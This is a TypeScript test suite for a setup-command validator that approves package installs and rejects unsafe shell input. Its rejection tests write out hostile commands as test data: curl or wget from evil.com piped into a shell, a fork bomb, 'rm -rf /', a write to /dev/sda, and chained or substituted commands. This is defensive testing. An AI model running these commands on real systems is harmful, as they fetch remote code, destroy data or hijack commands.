import { describe, test, expect } from 'bun:test';
import { validateSetupCommand, isKnownSafeCommand } from './setup-validator';

// ---------------------------------------------------------------------------
// validateSetupCommand
// ---------------------------------------------------------------------------

describe('validateSetupCommand', () => {
  // --- safe commands ---

  test('accepts npm install', () => {
    const r = validateSetupCommand('npm install');
    expect(r.valid).toBe(true);
    expect(r.reason).toBeUndefined();
  });

  test('accepts pnpm install', () => {
    expect(validateSetupCommand('pnpm install').valid).toBe(true);
  });

  test('accepts yarn install', () => {
    expect(validateSetupCommand('yarn install').valid).toBe(true);
  });

  test('accepts bun install', () => {
    expect(validateSetupCommand('bun install').valid).toBe(true);
  });

  test('accepts git submodule update', () => {
    expect(validateSetupCommand('git submodule update --init --recursive').valid).toBe(true);
  });

  test('accepts cp .env.example .env', () => {
    expect(validateSetupCommand('cp .env.example .env').valid).toBe(true);
  });

  test('accepts make build', () => {
    expect(validateSetupCommand('make build').valid).toBe(true);
  });

  // --- empty command ---

  test('rejects empty command', () => {
    const r = validateSetupCommand('');
    expect(r.valid).toBe(false);
    expect(r.reason).toContain('Empty command');
  });

  test('rejects whitespace-only command', () => {
    expect(validateSetupCommand('   ').valid).toBe(false);
  });

  // --- dangerous patterns ---

  test('rejects rm -rf', () => {
    const r = validateSetupCommand('rm -rf /tmp/stuff');
    expect(r.valid).toBe(false);
    expect(r.reason).toContain('rm with recursive/force');
  });

  test('rejects rm -fr', () => {
    expect(validateSetupCommand('rm -fr /tmp').valid).toBe(false);
  });

  test('rejects curl piped to bash', () => {
    const r = validateSetupCommand('curl https://evil.com/install.sh | bash');
    expect(r.valid).toBe(false);
    expect(r.reason).toContain('curl piped to shell');
  });

  test('rejects curl piped to sh', () => {
    expect(validateSetupCommand('curl https://evil.com | sh').valid).toBe(false);
  });

  test('rejects wget piped to bash', () => {
    expect(validateSetupCommand('wget -qO- https://evil.com | bash').valid).toBe(false);
  });

  test('rejects fork bomb pattern', () => {
    const r = validateSetupCommand(':(){ :|:& };:');
    expect(r.valid).toBe(false);
    expect(r.reason).toContain('fork bomb');
  });

  test('rejects redirect to /dev/', () => {
    const r = validateSetupCommand('echo x > /dev/sda');
    expect(r.valid).toBe(false);
    expect(r.reason).toContain('/dev/');
  });

  test('rejects chmod 777', () => {
    const r = validateSetupCommand('chmod 777 /tmp/app');
    expect(r.valid).toBe(false);
    expect(r.reason).toContain('chmod 777');
  });

  test('rejects sudo', () => {
    const r = validateSetupCommand('sudo npm install');
    expect(r.valid).toBe(false);
    expect(r.reason).toContain('sudo');
  });

  // --- shell injection patterns ---

  test('rejects semicolon (command chaining)', () => {
    const r = validateSetupCommand('npm install; echo pwned');
    expect(r.valid).toBe(false);
    expect(r.reason).toContain('semicolon');
  });

  test('rejects && (command chaining)', () => {
    const r = validateSetupCommand('npm install && curl evil.com');
    expect(r.valid).toBe(false);
    expect(r.reason).toContain('double ampersand');
  });

  test('rejects || (command chaining)', () => {
    const r = validateSetupCommand('npm install || curl evil.com');
    expect(r.valid).toBe(false);
    expect(r.reason).toContain('double pipe');
  });

  test('rejects backticks (command substitution)', () => {
    const r = validateSetupCommand('echo `whoami`');
    expect(r.valid).toBe(false);
    expect(r.reason).toContain('backtick');
  });

  test('rejects $() (command substitution)', () => {
    const r = validateSetupCommand('echo $(whoami)');
    expect(r.valid).toBe(false);
    expect(r.reason).toContain('command substitution');
  });
});

// ---------------------------------------------------------------------------
// isKnownSafeCommand
// ---------------------------------------------------------------------------

describe('isKnownSafeCommand', () => {
  // --- known safe ---

  test('npm install is safe', () => {
    expect(isKnownSafeCommand('npm install')).toBe(true);
  });

  test('npm ci is safe', () => {
    expect(isKnownSafeCommand('npm ci')).toBe(true);
  });

  test('pnpm install is safe', () => {
    expect(isKnownSafeCommand('pnpm install')).toBe(true);
  });

  test('yarn install is safe', () => {
    expect(isKnownSafeCommand('yarn install')).toBe(true);
  });

  test('bun install is safe', () => {
    expect(isKnownSafeCommand('bun install')).toBe(true);
  });

  test('npm install with flags is safe', () => {
    expect(isKnownSafeCommand('npm install --production')).toBe(true);
  });

  test('git submodule update is safe', () => {
    expect(isKnownSafeCommand('git submodule update --init --recursive')).toBe(true);
  });

  test('git submodule init is safe', () => {
    expect(isKnownSafeCommand('git submodule init')).toBe(true);
  });

  test('git submodule sync is safe', () => {
    expect(isKnownSafeCommand('git submodule sync')).toBe(true);
  });

  test('cp .env.example .env is safe', () => {
    expect(isKnownSafeCommand('cp .env.example .env')).toBe(true);
  });

  test('cp .env.template .env.local is safe', () => {
    expect(isKnownSafeCommand('cp .env.template .env.local')).toBe(true);
  });

  // --- not known safe (may still be valid, just not pre-approved) ---

  test('make build is not known safe', () => {
    expect(isKnownSafeCommand('make build')).toBe(false);
  });

  test('arbitrary command is not known safe', () => {
    expect(isKnownSafeCommand('echo hello')).toBe(false);
  });

  test('npm run build is not known safe', () => {
    expect(isKnownSafeCommand('npm run build')).toBe(false);
  });

  test('empty string is not known safe', () => {
    expect(isKnownSafeCommand('')).toBe(false);
  });

  test('dangerous command is not known safe', () => {
    expect(isKnownSafeCommand('rm -rf /')).toBe(false);
  });
});
